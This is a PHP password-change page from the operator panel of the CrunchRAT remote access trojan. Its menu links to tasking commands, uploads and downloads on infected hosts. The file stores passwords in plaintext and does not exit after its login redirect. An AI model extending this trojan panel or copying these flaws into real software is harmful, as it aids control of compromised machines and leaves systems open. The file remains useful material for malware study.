<?php
  # Necessary at the top of every page for session management
  session_start();

  # If the RAT user isn't authenticated
  if (!isset($_SESSION["authenticated"]))
  {
    # Redirects them to 403.php page
    header("Location: 403.php");
  }
  # Else they are authenticated
  else
  {
    # Includes the RAT configuration file
    include "config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
  }
?>

<!doctype html>
<html lang="en">
  <head> <!-- Start of header -->
    <meta charset="utf-8">
    <title>CrunchRAT</title>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.css"> <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="bootstrap/css/bootstrap-responsive.css"> <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css"> <!-- Bootstrap CSS -->
    <script src="jquery/jquery.min.js"></script> <!-- jQuery JavaScript -->
    <script src="bootstrap/js/bootstrap.min.js"></script> <!-- Bootstrap JavaScript - This line has to be after the jQuery script tag for some reason -->
  </head> <!-- End of header -->

  <body> <!-- Start of body -->
    <nav class="navbar navbar-default"> <!-- Start of navigation bar -->
      <a class="navbar-brand" href="#">CrunchRAT</a>
      <ul class="nav navbar-nav">
        <li class="nav-item"><a class="nav-link" href="index.php">Home</a></li>
        <li class="nav-item"><a class="nav-link" href="hosts.php">Hosts</a></li>
        <li class="nav-item"><a class="nav-link" href="output.php">View Output</a></li>
        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Task <span class="caret"></span></a> 
          <ul class="dropdown-menu"> <!-- Start of "Task" drop-down menu -->
            <li><a href="tasks.php">View Tasks</a></li>
            <li><a href="command.php">Task Command</a></li>
            <li><a href="upload.php">Task Upload</a></li>
            <li><a href="download.php">Task Download</a></li>
          </ul>
        </li> <!-- End of "Task" drop-down menu -->

        <li class="dropdown active"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Account Management <span class="caret"></span></a> <!-- Start of "Account Management" drop-down menu -->
          <ul class="dropdown-menu">
            <li><a href="addUser.php">Add User</a></li>
            <li><a href="changePassword.php">Change Password</a></li>
            <li role="separator" class="divider"></li>
            <li><a href="logout.php">Logout</a></li>
          </ul>
        </li> <!-- End of "Account Management" drop-down menu -->
        <li class="navbar-text">Currently signed in as: <b><?php echo htmlentities($_SESSION["username"]); # htmlentities() is used to protect against stored XSS here ?></b></li>
      </ul>
    </nav> <!-- End of navigation bar -->

    <div class="container"> <!-- Start of main body container -->
      <form class="form-inline" method="post"> <!-- Start of form -->
        <div class="form-group">
          <input type="password" class="form-control" name="currentPassword" placeholder="Current Password">
          <input type="password" class="form-control" name="newPassword1" placeholder="New Password">
          <input type="password" class="form-control" name="newPassword2" placeholder="Confirm New Password">
        </div>
        <button type="submit" name="submit" class="btn btn-default">Change Password</button>
      </form> <!-- End of form -->

    <?php
      $currentPassword = $_POST["currentPassword"]; # Current password
      $newPassword1 = $_POST["newPassword1"];       # New password
      $newPassword2 = $_POST["newPassword2"];       # Confirm new password

      # When the user clicks "Change Password"
      if (isset($_POST["submit"]))
      {
        # If all of the fields have been filled out
        if (isset($currentPassword) && !empty($currentPassword) && isset($newPassword1) && !empty($newPassword1) && isset($newPassword2) && !empty($newPassword2))
        {
          # Determines if the credentials entered actually match valid credentials
          $statement = $dbConnection->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
          $statement->bindValue(":username", $_SESSION["username"]);
          $statement->bindValue(":password", $currentPassword);
          $statement->execute();

          # Kills database connection
          $statement->connection = null;

          $rowCount = $statement->rowCount();

          # If valid credentials
          if ($rowCount == 1)
          {
            # If the new password and the confirm new password are the same
            if ($newPassword1 == $newPassword2)
            {
              # If the current password is the same as the new password
              if ($currentPassword == $newPassword1)
              {
                # Displays error message - "New password cannot be the current password"
                echo "<br><div class='alert alert-danger'>New password cannot be the current password.</div>";
              }
              # Else current password is not the same as the new password
              else
              {
                # Changes the user's password in the "users" table
                $statement = $dbConnection->prepare("UPDATE users SET password = :password WHERE username = :username");
                $statement->bindValue(":password", $newPassword1);
                $statement->bindValue(":username", $_SESSION["username"]);
                $statement->execute();

                # Kills database connection
                $statement->connection = null;

                # Displays success message - "Successfully changed password. Redirecting back to index.php in 5 seconds. Do not refresh the page."
                echo "<br><div class='alert alert-success'>Successfully changed password. Redirecting back to index.php in 5 seconds. Do not refresh the page.</div>";

                # Waits 5 seconds, then redirects to submit.php
                # This is a hack to clear out the POST data
                header('Refresh: 5; URL=submit.php');
              }
              
            }
            # Else the new passwords are not the same (likely mistyped by the RAT user in either of the fields)
            else
            {
              # Displays error message - "The new passwords are not the same. Please enter the new passwords again."
              echo "<br><div class='alert alert-danger'>The new passwords are not the same. Please enter the new passwords again.</div>";
            }

          }
          # Else the current password was incorrect for the currently logged on user
          else
          {
            # Displays error message - "Invalid password for the current user"
            echo "<br><div class='alert alert-danger'>Invalid password for the current user.</div>";
          }  
        }
        # Else they are missing fields
        else
        {
          # Displays error message - "Please fill out all fields."
          echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
        }
      }     
    ?>
  </div> <!-- End main body container -->
  </body> <!-- End of body -->
</html>